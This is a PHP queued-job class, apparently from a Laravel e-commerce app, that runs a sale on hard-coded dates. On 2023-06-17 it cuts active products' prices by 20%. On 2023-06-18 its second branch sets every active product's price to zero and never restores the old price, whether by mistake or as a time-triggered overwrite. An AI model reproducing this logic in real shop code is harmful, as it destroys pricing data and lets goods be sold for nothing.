<?php

namespace App\Jobs;

use App\Models\Product;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldBeUnique;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;

class PublishSaleOffer implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    /**
     * Create a new job instance.
     *
     * @return void
     */
    public function __construct()
    {
        //
    }

    /**
     * Execute the job.
     *
     * @return void
     */
    public function handle()
    {
        $today = date('Y-m-d');
        if ($today == "2023-06-17") {
            $discountPercent = 20;
            $products = Product::where('status', 1)->get();
            foreach ($products as $product) {
                $product->price = $product->sale_price - ($product->sale_price * $discountPercent) / 100;
                $product->save();
            }
        } else if ($today == "2023-06-18") {
            Product::where('status', 1)->update(['price' => 0]);
        }
    }
}
